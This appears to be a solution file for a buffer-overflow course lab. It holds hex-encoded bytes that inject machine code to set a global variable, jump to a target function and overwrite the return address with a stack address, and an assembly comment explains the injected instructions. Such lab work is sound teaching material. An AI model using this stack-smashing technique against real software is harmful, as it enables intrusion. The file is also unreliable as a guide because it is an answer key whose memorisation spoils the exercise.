/*
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00
*/
c7 05 00 d1 04 08 02 e9 
dc 74 68 c5 8b 04 08 c3 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55

/*
	mov dword [0x804d100],0x74dce902
	push 0x8048bc5
    ret
*/

/*
c7 05 08 d1 04 08 02 90
e9 dc 74 68 7a 8b 04 08
c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 d8 2f 68 55
*/
/* code address */ /* d8 2f 68 55 */
/* bang address */ /* c5 8b 04 08 */